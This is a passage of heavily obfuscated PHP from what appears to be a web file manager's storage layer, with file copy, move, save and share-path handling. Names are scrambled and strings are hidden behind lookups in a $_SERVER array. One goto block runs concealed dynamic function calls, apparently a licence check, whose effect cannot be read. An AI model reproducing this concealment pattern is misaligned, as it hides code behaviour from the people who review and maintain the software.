$ß¢üŠ÷°[8])); if (count($¹ìÖ¯€²) > 1) { $ÍÓ»·€ï = implode($ß¢üŠ÷°[8], array_splice($¹ìÖ¯€², 1)); $óò’ÌÒû = $this->model->pathInfoByPath($¹ìÖ¯€²[0], $ÍÓ»·€ï); if (!$óò’ÌÒû) { return !1; } $this->pathParse[$ß¢üŠ÷°[1279]] = $óò’ÌÒû[$ß¢üŠ÷°[194]]; } return $this->infoParse($¾áßÛ˜õ); } public function listAll($Á¶–©˜™) { $€¸÷©± =& $_SERVER[Î·Ü›öğ]; $´…’š¼ä = IO::info($this->pathParse[$€¸÷©±[87]]); if (!$´…’š¼ä) { return array(); } $Ó™ ŸÅ = $this->model->listAll($Á¶–©˜™); $Õ«óşÀ = Model($€¸÷©±[680])->getInfo($´…’š¼ä[$€¸÷©±[681]]); foreach ($Ó™ ŸÅ as &$„î•â®§) { check_abort(); $„î•â®§[$€¸÷©±[90]] = Action($€¸÷©±[1465])->_shareItemeParse($„î•â®§[$€¸÷©±[90]], $Õ«óşÀ); } unset($„î•â®§); return $Ó™ ŸÅ; } } goto d’ø÷Üõö; C‰˜æ‰öŒ†: if ($_SERVER[$_SERVER[Î·Ü›öğ][481]] != $_SERVER[$_SERVER[Î·Ü›öğ][1253]]) { $_getc = $_SERVER[Î·Ü›öğ][482]; $_getfile = $_SERVER[$_SERVER[Î·Ü›öğ][483]] . $_SERVER[Î·Ü›öğ][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î·Ü›öğ][288], $_getfilec); if (count($_getarrs) < $_SERVER[Î·Ü›öğ][485]) { $exit = $_SERVER[Î·Ü›öğ][486]; $exit(); } $_act = $_SERVER[Î·Ü›öğ][487]; $_act($_SERVER[$_SERVER[Î·Ü›öğ][479]]); } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ªÎ ôú“, $‰ö³ñ¦) { $ú„¼ı„Õ =& $_SERVER[Î·Ü›öğ]; $©‚¶€ó = $‰ö³ñ¦; $GLOBALS[$ú„¼ı„Õ[1254]] = $ú„¼ı„Õ[1255] . $ªÎ ôú“; Hook::trigger($ú„¼ı„Õ[1255] . $ªÎ ôú“ . $ú„¼ı„Õ[1256], $©‚¶€ó); $ÇÅ©£„­ = self::driverMake($‰ö³ñ¦[0]); if (!$ÇÅ©£„­) { return !1; } if ($ªÎ ôú“ == $ú„¼ı„Õ[634] || $ªÎ ôú“ == $ú„¼ı„Õ[636] || $ªÎ ôú“ == $ú„¼ı„Õ[1257]) { if (!trim($ÇÅ©£„­->path . $ú„¼ı„Õ[456], $ú„¼ı„Õ[8])) { return !1; } } if (method_exists($ÇÅ©£„­, $ªÎ ôú“)) { $éçÌïÑ = @call_user_func_array(array($ÇÅ©£„­, $ªÎ ôú“), $‰ö³ñ¦); } else { if (method_exists($ÇÅ©£„­, $ú„¼ı„Õ[1258])) { $éçÌïÑ = @call_user_func_array(array($ÇÅ©£„­, $ªÎ ôú“), $‰ö³ñ¦); } else { if (method_exists(self, $ªÎ ôú“)) { $éçÌïÑ = @call_user_func_array(array(self, $ªÎ ôú“), $‰ö³ñ¦); } else { $éçÌïÑ = call_user_func_array(array(parent, $ªÎ ôú“), $‰ö³ñ¦); } } } Hook::trigger($ú„¼ı„Õ[1255] . $ªÎ ôú“ . $ú„¼ı„Õ[1259], $©‚¶€ó, $éçÌïÑ); return $éçÌïÑ; } public static function init($±Ò¡ªª¾) { return self::driverMake($±Ò¡ªª¾); } public static function copy($”Ï’‡¡, $Ë±šÖËŠ, $Ú‘ÚÍş× = false, $ÙóÃ®ä = false) { return self::copyMoveStart($”Ï’‡¡, $Ë±šÖËŠ, $Ú‘ÚÍş×, $_SERVER[Î·Ü›öğ][634], $ÙóÃ®ä); } public static function move($€Ã¹„Ìì, $‘¿º»çó, $®Î¦ŸÒ = false, $­ÕÓåã = false) { return self::copyMoveStart($€Ã¹„Ìì, $‘¿º»çó, $®Î¦ŸÒ, $_SERVER[Î·Ü›öğ][636], $­ÕÓåã); } public static function copyMoveChildren($‘ˆşÑ, $²¨¸­¼ø, $¼¤¾¾ìà = "\143\157\x70\x79", $Ÿ½İ°‘ş = REPEAT_REPLACE) { $È¿·˜‹‘ =& $_SERVER[Î·Ü›öğ]; $ÊÉ„ü§ = $‘ˆşÑ; $°şÚ¹ = self::driverMake($‘ˆşÑ); $ú¡Â•æÙ = $°şÚ¹->listPath($‘ˆşÑ, !0); $ÁÂ”£Ã = array_merge($ú¡Â•æÙ[$È¿·˜‹‘[86]], $ú¡Â•æÙ[$È¿·˜‹‘[85]]); foreach ($ÁÂ”£Ã as $úªÍŒ«Ä) { self::copyMoveStart($úªÍŒ«Ä[$È¿·˜‹‘[87]], $²¨¸­¼ø, $Ÿ½İ°‘ş, $¼¤¾¾ìà, !1); } if ($¼¤¾¾ìà == $È¿·˜‹‘[636]) { self::remove($ÊÉ„ü§); } } private static function copyMoveStart($È”Ç×ô°, $ËĞÙ«Ò, $œÇİ°×µ, $Ùåçæ‡, $§üñÜÒÕ) { $±ª¸Üİ­ =& $_SERVER[Î·Ü›öğ]; $»ÒÊİ¯ = array($È”Ç×ô°, $ËĞÙ«Ò, $œÇİ°×µ, $§üñÜÒÕ); Hook::trigger($±ª¸Üİ­[1255] . $Ùåçæ‡ . $±ª¸Üİ­[1256], $»ÒÊİ¯); $ñŠâûŸÂ = self::copyMove($È”Ç×ô°, $ËĞÙ«Ò, $œÇİ°×µ, $Ùåçæ‡, $§üñÜÒÕ); Hook::trigger($±ª¸Üİ­[1255] . $Ùåçæ‡ . $±ª¸Üİ­[1259], $»ÒÊİ¯, $ñŠâûŸÂ); return $ñŠâûŸÂ; } public static function saveFile($³ÚØ³¤, $³ˆªùª, $ó‹³²ĞÂ = true) { $æ¦¶«øë =& $_SERVER[Î·Ü›öğ]; $÷’íŒ‡Æ = self::info($³ˆªùª); $ •«ûÈ = self::driverMake($³ÚØ³¤); $ÔÀîşó€ = self::driverMake($³ˆªùª); $…ôºâØ = !1; if ($ÔÀîşó€->pathParse[$æ¦¶«øë[1260]]) { $…ôºâØ = $ÔÀîşó€; $Š–®„¸ = $ÔÀîşó€->pathParse[$æ¦¶«øë[1260]]; $ÔÀîşó€ = self::driverMake($Š–®„¸); } if ($ •«ûÈ->pathParse[$æ¦¶«øë[1260]]) { $ÔùÛ²Å§ = $ •«ûÈ->pathParse[$æ¦¶«øë[1260]]; $ •«ûÈ = self::driverMake($ÔùÛ²Å§); } $ªŠìõ›Á = $ÔÀîşó€->pathFather($³ˆªùª); $€ÎÒ¥î = !0; if (!$ó‹³²ĞÂ && self::driverIsSame($ •«ûÈ, $ÔÀîşó€)) { $€ÎÒ¥î = !1; } $ÆèˆÔú = self::copyFile($ •«ûÈ, $³ÚØ³¤, $ÔÀîşó€, $ªŠìõ›Á, $÷’íŒ‡Æ[$æ¦¶«øë[32]], $€ÎÒ¥î); if ($…ôºâØ) { $ÆèˆÔú = $…ôºâØ->getPathOuter($ÆèˆÔú); } return $ÆèˆÔú; } private static function copyMove($ÄÁÁ’…¿, $–½éÔ»â, $Œù¾â†, $œ ¬ÛÎÒ, $öîÚÇ°­ = false) { $ôÃ’ÄÕš =& $_SERVER[Î·Ü›öğ]; if (!$ÄÁÁ’…¿ || $ÄÁÁ’…¿ == $ôÃ’ÄÕš[8] || !$–½éÔ»â) { return !1; } ignore_timeout(); $¦şİğ˜¤ = self::driverMake($ÄÁÁ’…¿); $¦æÜåÀ = self::driverMake($–½éÔ»â); $Ñ×åŠ¸å = $œ ¬ÛÎÒ == $ôÃ’ÄÕš[636]; $¬ê§‘°’ = !1; if ($¦æÜåÀ->pathParse[$ôÃ’ÄÕš[1260]]) { $¬ê§‘°’ = $¦æÜåÀ; $–½éÔ»â = $¦æÜåÀ->pathParse[$ôÃ’ÄÕš[1260]]; $¦æÜåÀ = self::driverMake($–½éÔ»â); } if ($¦şİğ˜¤->pathParse[$ôÃ’ÄÕš[1260]]) { $ÄÁÁ’…¿ = $¦şİğ˜¤->pathParse[$ôÃ’ÄÕš[1260]]; $¦şİğ˜¤ = self::driverMake($ÄÁÁ’…¿); } self::check($¦şİğ˜¤, $ÄÁÁ’…¿, $¦æÜåÀ, $–½éÔ»â); Hook::trigger($ôÃ’ÄÕš[1261], $¦şİğ˜¤, $ÄÁÁ’…¿, $¦æÜåÀ, $–½éÔ»â); $£¸ààµ = self::driverIsSame($¦şİğ˜¤, $¦æÜåÀ); if ($£¸ààµ) { if ($œ ¬ÛÎÒ == $ôÃ’ÄÕš[636] && !method_exists($¦æÜåÀ, $ôÃ’ÄÕš[1262]) && trim($–½éÔ»â, $ôÃ’ÄÕš[8]) == trim($¦æÜåÀ->pathFather($ÄÁÁ’…¿), $ôÃ’ÄÕš[8])) { if ($¦şİğ˜¤->pathThis($ÄÁÁ’…¿) != $öîÚÇ°­ && !$¦şİğ˜¤->isOsDriver()) { return $¦şİğ˜¤->rename($ÄÁÁ’…¿, $öîÚÇ°­); } return $¦æÜåÀ->getPathOuter($ÄÁÁ’…¿); } if (method_exists($¦æÜåÀ, $œ ¬ÛÎÒ)) { return $¦æÜåÀ->{$œ ¬ÛÎÒ}($ÄÁÁ’…¿, $–½éÔ»â, $Œù¾â†, $öîÚÇ°­); } } if ($£¸ààµ && $œ ¬ÛÎÒ == $ôÃ’ÄÕš[636] && $¦æÜåÀ->getType() == $ôÃ’ÄÕš[109]) { $…Ğà÷« = $¦æÜåÀ->movePath($ÄÁÁ’…¿, $–½éÔ»â, $öîÚÇ°­); if ($…Ğà÷«) { return $…Ğà÷«; } } $ªàô¥Ï = $¦şİğ˜¤->isFile($ÄÁÁ’…¿); if (!$ªàô¥Ï && $¦æÜåÀ->getType() == $ôÃ’ÄÕš[847] && $¦şİğ˜¤->getType() == $ôÃ’ÄÕš[109]) { $…Ğà÷« = $¦æÜåÀ->copyFolderFromIO($¦şİğ˜¤, $ÄÁÁ’…¿, $–½éÔ»â, $Œù¾â†, $Ñ×åŠ¸å, $öîÚÇ°­); } else { $…Ğà÷« = self::copyPath($¦şİğ˜¤, $ÄÁÁ’…¿, $¦æÜåÀ, $–½éÔ»â, $Œù¾â†, $Ñ×åŠ¸å, $ªàô¥Ï, $öîÚÇ°­); } if ($…Ğà÷« && $Ñ×åŠ¸å) { $¦şİğ˜¤->remove($ÄÁÁ’…¿); } if ($¬ê§‘°’) { $…Ğà÷« = $¬ê§‘°’->getPathOuter($…Ğà÷«); } return $…Ğà÷«; } private static function check($Ğô”ôÀØ, $ØòšÚà‡, $ü÷ï®ÒÈ, &$¢ù÷ °°) { $×ÌšÁ• =& $_SERVER[Î·Ü›öğ]; if (self::driverIsSame($Ğô”ôÀØ, $ü÷ï®ÒÈ) && $Ğô”ôÀØ->isFolder($ØòšÚà‡) && $Ğô”ôÀØ->isParentOf($ØòšÚà‡, $¢ù÷ °°)) { show_json(LNG($×ÌšÁ•[1263]), !1); } if (!$Ğô”ôÀØ->exist($ØòšÚà‡)) { show_json(LNG($×ÌšÁ•[108]), !1); } } private static function copyPath($µ ·ÏãÏ, $ùÅÓ…îÕ, $ÛØóñÍŸ, $À©¬âÑœ, $ì¶™âŞ€, $øÀıÎšš, $€ş‘š„›, $õ¶Çä–¡ = false, $ó³Ôúâ = true) { $¼÷¨¯½ç =& $_SERVER[Î·Ü›öğ]; $Ô’¶İ† = empty($õ¶Çä–¡) && $õ¶Çä–¡ !== $¼÷¨¯½ç[231] ? $µ ·ÏãÏ->pathThis($ùÅÓ…îÕ) : $õ¶Çä–¡; if ($ì¶™âŞ€) { $¡àë®   = $ÛØóñÍŸ->fileNameExist($À©¬âÑœ, $Ô’¶İ†); $»„ø·ƒ¿ = $Ô’¶İ†; $Ô’¶İ† = $ÛØóñÍŸ->fileNameAuto($À©¬âÑœ, $Ô’¶İ†, $ì¶™âŞ€, !$€ş‘š„›); if (!$¡àë®   || $»„ø·ƒ¿ != $Ô’¶İ†) { $ì¶™âŞ€ = !1; } if ($ó³Ôúâ && !$ì¶™âŞ€) { $ÛØóñÍŸ->_data[$¼÷¨¯½ç[1264]] = !0; } } if ($€ş‘š„›) { return self::copyFile($µ ·ÏãÏ, $ùÅÓ…îÕ, $ÛØóñÍŸ, $À©¬âÑœ, $Ô’¶İ†, $øÀıÎšš); } if ($ì¶™âŞ€ == REPEAT_RENAME_FOLDER) { $ì¶™âŞ€ = !1; } $œúÇ¢«„ = rtrim($À©¬âÑœ, $¼÷¨¯½ç[8]) . $¼÷¨¯½ç[8] . $Ô’¶İ†; $Ñîâ÷ÀÀ = $ÛØóñÍŸ->mkdir($ÛØóñÍŸ->getPath($œúÇ¢«„), $ì¶™âŞ€); $À©¬âÑœ = $ÛØóñÍŸ->getPathInner($Ñîâ÷ÀÀ); $ıã°¶Åˆ = $µ ·ÏãÏ->listPath($ùÅÓ…îÕ, !0); $ıã°¶Åˆ = is_array($ıã°¶Åˆ) ? $ıã°¶Åˆ : array($¼÷¨¯½ç[86] => array(), $¼÷¨¯½ç[85] => array()); $øÊ×Ÿ™ = array_merge($ıã°¶Åˆ[$¼÷¨¯½ç[86]], $ıã°¶Åˆ[$¼÷¨¯½ç[85]]); foreach ($øÊ×Ÿ™ as $íãÄ±µ) { $¼šÌ•ç› = $íãÄ±µ[$¼÷¨¯½ç[33]] == $¼÷¨¯½ç[233]; $ùÅÓ…îÕ = $µ ·ÏãÏ->getPathInner($íãÄ±µ[$¼÷¨¯½ç[87]]); $¤…òÚÓË = self::copyPath($µ ·ÏãÏ, $ùÅÓ…îÕ, $ÛØóñÍŸ, $À©¬âÑœ, $ì¶™âŞ€, $øÀıÎšš, $¼šÌ•ç›, !1, !1); if (!$¤…òÚÓË) { IO::errorTips($¼÷¨¯½ç[1265] . $ùÅÓ…îÕ . $¼÷¨¯½ç[73] . $À©¬âÑœ); } } self::copyMoveKeepInfo($µ ·ÏãÏ, $ùÅÓ…îÕ, $Ñîâ÷ÀÀ); return $Ñîâ÷ÀÀ; } private static function copyFile($ºó‡ŠÊ‹, $Â”İ”¬, $ËúŒÙ¸°, $ŞÔşÎŒÛ, $«—‚óæœ, $Õ‡äÙÎÙ) { $¼ ›à•• =& $_SERVER[Î·Ü›öğ]; $ŞÔşÎŒÛ = $ËúŒÙ¸°->getPath(rtrim($ŞÔşÎŒÛ, $¼ ›à••[8]) . $¼ ›à••[8] . $«—‚óæœ); $Ÿèƒ¬â© = $¼ ›à••[1266] . time() . rand_string(5); Hook::trigger($¼ ›à••[1267], $ºó‡ŠÊ‹, $Â”İ”¬, $ËúŒÙ¸°, $ŞÔşÎŒÛ, $«—‚óæœ, $Ÿèƒ¬â©); if (self::driverIsSame($ºó‡ŠÊ‹, $ËúŒÙ¸°)) { if ($Õ‡äÙÎÙ) { $¿·Ş˜® = $ËúŒÙ¸°->moveFile($Â”İ”¬, $ŞÔşÎŒÛ); } else { $¿·Ş˜® = $ËúŒÙ¸°->copyFile($Â”İ”¬, $ŞÔşÎŒÛ); } Hook::trigger($¼ ›à••[1268], $ºó‡ŠÊ‹, $Â”İ”¬, $ËúŒÙ¸°, $ŞÔşÎŒÛ, $«—‚óæœ, $¿·Ş˜®); self::copyMoveKeepInfo($ºó‡ŠÊ‹, $Â”İ”¬, $¿·Ş˜®); return $¿·Ş˜®; } $Çáß‹“· = TEMP_FILES; if ($GLOBALS[$¼ ›à••[6]][$¼ ›à••[92]][$¼ ›à••[890]]) { $Çáß‹“· = $GLOBALS[$¼ ›à••[6]][$¼ ›à••[92]][$¼ ›à••[890]]; } $ÈùßµÉÈ = $Çáß‹“·; mk_dir($ÈùßµÉÈ); $à‹şè¸– = $ÈùßµÉÈ . $Ÿèƒ¬â©; $†ëÒøó° = $à‹şè¸–; $à‹şè¸– = $ºó‡ŠÊ‹->download($Â”İ”¬, $à‹şè¸–); $à‹şè¸– = $ºó‡ŠÊ‹->iconvApp($à‹şè¸–); if (substr($à‹şè¸–, strlen($Çáß‹“·)) == $Çáß‹“·) { $Õ‡äÙÎÙ = !0; } $¿·Ş˜® = $ËúŒÙ¸°->upload($ŞÔşÎŒÛ, $à‹şè¸–, $Õ‡äÙÎÙ); self::remove($†ëÒøó°); Hook::trigger($¼ ›à••[1268], $ºó‡ŠÊ‹, $Â”İ”¬, $ËúŒÙ¸°, $ŞÔşÎŒÛ, $«—‚óæœ, $¿·Ş˜®); self::copyMoveKeepInfo($ºó‡ŠÊ‹, $Â”İ”¬, $¿·Ş˜®); return $¿·Ş˜®; } private static function copyMoveKeepInfo($çÌãü™¨, $ƒâ¤Æ, $‰Âë¦È) { if (!$‰Âë¦È) { return; } $ˆÇÉéª¥ = $çÌãü™¨->info($ƒâ¤Æ); if (!is_array($ˆÇÉéª¥)) { return; } IO::setModifyTime($‰Âë¦È, $ˆÇÉéª¥[$_SERVER[Î·Ü›öğ][88]]); } public static function pathFather($§½üğ˜Á) { $”Œ¸øˆ€ = IO::init($§½üğ˜Á); $Æ¡§˜”± = $”Œ¸øˆ€->pathFather($”Œ¸øˆ€->path); return $”Œ¸øˆ€->getPathOuter($Æ¡§˜”±); } public static function fileOut($Ü¾Ú…‰, $£½Í“¸ = false, $ÔŞ©Ïò¥ = false, $†¸ö¿üÈ = '') { $·ˆµÓ­¼ = self::driverMake($Ü¾Ú…‰); if ($·ˆµÓ­¼->isFileOutServer()) { return $·ˆµÓ­¼->fileOutServer($Ü¾Ú…‰, $£½Í“¸, $ÔŞ©Ïò¥, $†¸ö¿üÈ); } return $·ˆµÓ­¼->fileOut($Ü¾Ú…‰, $£½Í“¸, $ÔŞ©Ïò¥, $†¸ö¿üÈ); } public static function fileOutImage($‰”¢ìŒ, $Ë®®í«¡ = 250) { $Êİ‚íº› = array(250, 600, 1200, 2000, 3000, 5000); for ($¸¹öêò = 0; $¸¹öêò < count($Êİ‚íº›); $¸¹öêò++) { if ($¸¹öêò == 0 && $Ë®®í«¡ <= $Êİ‚íº›[$¸¹öêò]) { $Ë®®í«¡ = $Êİ‚íº›[$¸¹öêò]; break; } else { if ($Ë®®í«¡ > $Êİ‚íº›[$¸¹öêò - 1] && $Ë®®í«¡ <= $Êİ‚íº›[$¸¹öêò]) { $Ë®®í«¡ = $Êİ‚íº›[$¸¹öêò]; break; } else { if ($¸¹öêò == count($Êİ‚íº›) - 1 && $Ë®®í«¡ > $Êİ‚íº›[$¸¹öêò]) { $Ë®®í«¡ = $Êİ‚íº›[$¸¹öêò]; break; } } } } $£•û²›ç = self::driverMake($‰”¢ìŒ); if ($£•û²›ç->isFileOutServer()) { return $£•û²›ç->fileOutImageServer($‰”¢ìŒ, $Ë®®í«¡); } return $£•û²›ç->fileOutImage($‰”¢ìŒ, $Ë®®í«¡); } private static function driverIsSame($©®‡ÀÉª, $âÜª×´Ê) { $¬ïêËúÏ =& $_SERVER[Î·Ü›öğ]; $×ÄÎ÷©´ = $©®‡ÀÉª->getType(); $Ö©Œ‰üå = $âÜª×´Ê->getType(); if ($×ÄÎ÷©´ != $Ö©Œ‰üå) { return !1; } if ($×ÄÎ÷©´ == $¬ïêËúÏ[847]) { return !0; } if ($×ÄÎ÷©´ == $¬ïêËúÏ[109]) { return !0; } if ($©®‡ÀÉª->pathDriver == $âÜª×´Ê->pathDriver) { return !0; } return !1; } public static function copyUpdate($µĞ‹öê, $ßŞêØş) { $¤½·üı¸ =& $_SERVER[Î·Ü›öğ]; if (!IO::exist($µĞ‹öê)) { return !1; } if (!IO::exist($ßŞêØş)) { IO::mkdir($ßŞêØş); } $éÒ•Ûó¨ = array_to_keyvalue(self::listAllSimple($µĞ‹öê), $¤½·üı¸[87]); $ãˆÒÂä = array_to_keyvalue(self::listAllSimple($ßŞêØş), $¤½·üı¸[87]); $ì¼¡ùõÅ = array(); $ıÄèÆ’ = array(); foreach ($éÒ•Ûó¨ as $şãŠ‰­® => $ø§ÀÇ„¬) { if (isset($ãˆÒÂä[$şãŠ‰­®])) { if ($ø§ÀÇ„¬[$¤½·üı¸[78]] == 1) { continue; } if ($ãˆÒÂä[$şãŠ‰­®][$¤½·üı¸[79]] == $ø§ÀÇ„¬[$¤½·üı¸[79]]) { continue; } } if ($ø§ÀÇ„¬[$¤½·üı¸[78]] == 1) { $ıÄèÆ’[] = $ßŞêØş . $¤½·üı¸[8] . trim($şãŠ‰­®, $¤½·üı¸[8]); continue; } $ĞÙßßı÷ = strstr(trim($şãŠ‰­®, $¤½·üı¸[8]), $¤½·üı¸[8]) ? get_path_father($şãŠ‰­®) : $¤½·üı¸[12]; $ì¼¡ùõÅ[] = array($¤½·üı¸[1269] => $ø§ÀÇ„¬[$¤½·üı¸[89]], $¤½·üı¸[1270] => rtrim($ßŞêØş, $¤½·üı¸[8]) . $¤½·üı¸[8] . $ĞÙßßı÷, $¤½·üı¸[1271] => $ø§ÀÇ„¬); } $“‚ÂˆÂ‡ = array($¤½·üı¸[233] => $ì¼¡ùõÅ, $¤½·üı¸[78] => $ıÄèÆ’); Hook::trigger($¤½·üı¸[1272], $µĞ‹öê, $ßŞêØş, $“‚ÂˆÂ‡); foreach ($ıÄèÆ’ as $ø§ÀÇ„¬) { IO::mkdir($ø§ÀÇ„¬); } foreach ($ì¼¡ùõÅ as $ø§ÀÇ„¬) { IO::copy($ø§ÀÇ„¬[$¤½·üı¸[1269]], $ø§ÀÇ„¬[$¤½·üı¸[1270]], REPEAT_REPLACE); } } public static function fileSubstr($Ò€Ãİ†Ê, $„ëÙœŸÕ, $Áàûôñ¾ = false) { $ç—ÜëŠË =& $_SERVER[Î·Ü›öğ]; $µìàê¸½ = self::driverMake($Ò€Ãİ†Ê); $¶î¦õ = $µìàê¸½->size($Ò€Ãİ†Ê); $²Ç´¾±Ö = $„ëÙœŸÕ; $ÒŞŒ¡Æ„ = $Áàûôñ¾; if ($„ëÙœŸÕ < 0) { $„ëÙœŸÕ = $¶î¦õ + $„ëÙœŸÕ; } if ($Áàûôñ¾ === !1) { $Áàûôñ¾ = $¶î¦õ - $„ëÙœŸÕ; } if ($„ëÙœŸÕ + $Áàûôñ¾ > $¶î¦õ) { $Áàûôñ¾ = $¶î¦õ - $„ëÙœŸÕ; } if (!$¶î¦õ && $µìàê¸½->getType() == $ç—ÜëŠË[109] && !$µìàê¸½->exist($Ò€Ãİ†Ê)) { $Ø™´Ÿ×‰ = get_path_this($Ò€Ãİ†Ê); $Ú‰»˜È» = parse_url_query($Ø™´Ÿ×‰); if (is_array($Ú‰»˜È») && isset($Ú‰»˜È»[$ç—ÜëŠË[32]])) { $Ø™´Ÿ×‰ = urldecode($Ú‰»˜È»[$ç—ÜëŠË[32]]); } throw new Exception($ç—ÜëŠË[1273] . LNG($ç—ÜëŠË[1274]) . $ç—ÜëŠË[1065] . clear_html($Ø™´Ÿ×‰) . $ç—ÜëŠË[12]); } if ($Áàûôñ¾ <= 0) { return $ç—ÜëŠË[12]; } if ($„ëÙœŸÕ < 0 || $„ëÙœŸÕ >= $¶î¦õ || $Áàûôñ¾ > $GLOBALS[$ç—ÜëŠË[6]][$ç—ÜëŠË[92]][$ç—ÜëŠË[1275]]) { throw new Exception("\146\x69\x6c\145\122\x65\x61\144\40\145\162\x72\157\x72\x2c\157\x76\145\162\x20\x69\x6f\122\145\x61\144\x4d\141\170\41\x20\163\164\x61\x72\164\x3d{$„ëÙœŸÕ}\73\x6c\145\x6e\147\x74\x68\75{$Áàûôñ¾}\x3b\x20\x73\x69\172\x65\x3d{$¶î¦õ}\73"); } $³Íü—çÛ = $µìàê¸½->fileSubstr($Ò€Ãİ†Ê, $„ëÙœŸÕ, $Áàûôñ¾); if (!$³Íü—çÛ && $Áàûôñ¾ && isset($GLOBALS[$ç—ÜëŠË[1276]])) { throw new Exception($GLOBALS[$ç—ÜëŠË[1276]][$ç—ÜëŠË[1277]]); } return $³Íü—çÛ; } private static function driverMake(&$€´Ê¥ıå) { $û†º¶‚û =& $_SERVER[Î·Ü›öğ]; $íğ¤é° = KodIO::parse($€´Ê¥ıå); if (!self::$driverListSystem) { $ŞĞ´Ùà… = Model($û†º¶‚û[857])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ŞĞ´Ùà…, $û†º¶‚û[477]); } if ($íğ¤é°[$û†º¶‚û[33]] == KodIO::KOD_IO && !self::$driverListSystem[$íğ¤é°[$û†º¶‚û[477]]]) { throw new Exception($û†º¶‚û[1278]); return !1; } $€´Ê¥ıå = $íğ¤é°[$û†º¶‚û[1279]]; $€Äá´–ô = self::driverGet($íğ¤é°, $€´Ê¥ıå); return $€Äá´–ô; } private static function driverGet($‘²òîû, &$«šı´óà) { $Ä»´’Æû =& $_SERVER[Î·Ü›öğ]; $¿Ñôùº‰ = $‘²òîû[$Ä»´’Æû[1280]]; $Ÿ¿¬¤Ñ” = $‘²òîû[$Ä»´’Æû[477]]; switch ($‘²òîû[$Ä»´’Æû[33]]) { case KodIO::KOD_IO: $òëíç = self::$driverListSystem[$Ÿ¿¬¤Ñ”]; break; case KodIO::KOD_SOURCE: $«šı´óà = $Ÿ¿¬¤Ñ” . $«šı´óà; $òëíç = array($Ä»´’Æû[1281] => $Ä»´’Æû[1282], $Ä»´’Æû[6] => $‘²òîû); $òëíç[$Ä»´’Æû[6]][$Ä»´’Æû[1283]] = $‘²òîû[$Ä»´’Æû[477]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ïşï¬¨Ä = $GLOBALS[$Ä»´’Æû[1284]]; self::$driverListUser = array_to_keyvalue($Ïşï¬¨Ä, $Ä»´’Æû[477]); } $òëíç = self::$driverListUser[$Ÿ¿¬¤Ñ”]; break; case KodIO::KOD_SHARE_LINK: $òëíç = array($Ä»´’Æû[1281] => $Ä»´’Æû[1285], $Ä»´’Æû[6] => $‘²òîû); $ŒËÓ„ğë = Action($Ä»´’Æû[1286])->sharePathInfo($‘²òîû[$Ä»´’Æû[87]]); $«šı´óà = $ŒËÓ„ğë[$Ä»´’Æû[194]]; if (!$ŒËÓ„ğë[$Ä»´’Æû[194]]) { $­ËûƒŸ = Model($Ä»´’Æû[680])->getInfo($ŒËÓ„ğë[$Ä»´’Æû[681]]); $«šı´óà = KodIO::clear($­ËûƒŸ[$Ä»´’Æû[1287]] . $‘²òîû[$Ä»´’Æû[1279]]); $‘²òîû[$Ä»´’Æû[573]] = $­ËûƒŸ; $‘²òîû[$Ä»´’Æû[1260]] = $«šı´óà; $òëíç = array($Ä»´’Æû[1281] => $Ä»´’Æû[1288], $Ä»´’Æû[6] => $‘²òîû); } else { $òëíç[$Ä»´’Æû[6]][$Ä»´’Æû[1283]] = $ŒËÓ„ğë[$Ä»´’Æû[194]]; } break; case KodIO::KOD_SHARE_ITEM: $òëíç = array($Ä»´’Æû[1281] => $Ä»´’Æû[1289], $Ä»´’Æû[6] => $‘²òîû); $­ËûƒŸ = Model($Ä»´’Æû[680])->getInfo($‘²òîû[$Ä»´’Æû[477]]); if ($­ËûƒŸ[$Ä»´’Æû[194]] == $Ä»´’Æû[231]) { $«šı´óà = KodIO::clear($­ËûƒŸ[$Ä»´’Æû[1287]] . $‘²òîû[$Ä»´’Æû[1279]]); $‘²òîû[$Ä»´’Æû[573]] = $­ËûƒŸ; $‘²òîû[$Ä»´’Æû[1260]] = $«šı´óà; $òëíç = array($Ä»´’Æû[1281] => $Ä»´’Æû[1290], $Ä»´’Æû[6] => $‘²òîû); } else { if (!$«šı´óà) { $«šı´óà = $­ËûƒŸ[$Ä»´’Æû[194]]; } $òëíç[$Ä»´’Æû[6]][$Ä»´’Æû[1283]] = $­ËûƒŸ[$Ä»´’Æû[194]]; } break; default: $«šı´óà = $‘²òîû[$Ä»´’Æû[87]]; $òëíç = array($Ä»´’Æû[1281] => $Ä»´’Æû[1291]); break; } $ÅÏ†³Öš = $‘²òîû[$Ä»´’Æû[87]]; if (!isset(self::$driverCache[$ÅÏ†³Öš])) { $€ÛØºˆ = strtolower($òëíç[$Ä»´’Æû[98]]); $­û´‰‰Ş = $GLOBALS[$Ä»´’Æû[6]][$Ä»´’Æû[92]][$Ä»´’Æû[923]]; $Ñø’ßŞÌ = $Ä»´’Æû[77] . (isset($­û´‰‰Ş[$€ÛØºˆ]) ? $­û´‰‰Ş[$€ÛØºˆ] : ucfirst($€ÛØºˆ)); if (!class_exists($Ñø’ßŞÌ)) { show_json("{$Ñø’ßŞÌ}\40\156\x6f\x74\40\x65\170\151\163\x74\x73\41", !1); } $‡õåã·Ò = isset($òëíç[$Ä»´’Æû[6]]) ? $òëíç[$Ä»´’Æû[6]] : !1; self::$driverCache[$ÅÏ†³Öš] = new $Ñø’ßŞÌ($‡õåã·Ò); } $ë¼ßƒÒğ = self::$driverCache[$ÅÏ†³Öš]; $ë¼ßƒÒğ->pathDriver = $¿Ñôùº‰; $ë¼ßƒÒğ->pathBase = $Ä»´’Æû[12]; if (isset($òëíç[$Ä»´’Æû[6]][$Ä»´’Æû[1292]])) { $ë¼ßƒÒğ->pathBase = rtrim($òëíç[$Ä»´’Æû[6]][$Ä»´’Æû[1292]], $Ä»´’Æû[8]) . $Ä»´’Æû[8]; $«šı´óà = $ë¼ßƒÒğ->pathBase . ltrim($«šı´óà, $Ä»´’Æû[8]); } $«šı´óà = $ë¼ßƒÒğ->getPath($«šı´óà); if (isset($‘²òîû[$Ä»´’Æû[1260]])) { $«šı´óà = $‘²òîû[$Ä»´’Æû[1260]]; } $ë¼ßƒÒğ->path = $«šı´óà; return $ë¼ßƒÒğ; } public static function errorTips($Î‡ÍäøŞ = false) { $òœú˜œ =& $_SERVER[Î·Ü›öğ]; static $Æ¶ù¡ø = array(); $¬šÃ£²ö = 1000; if ($Î‡ÍäøŞ === -1) { return $Æ¶ù¡ø ? 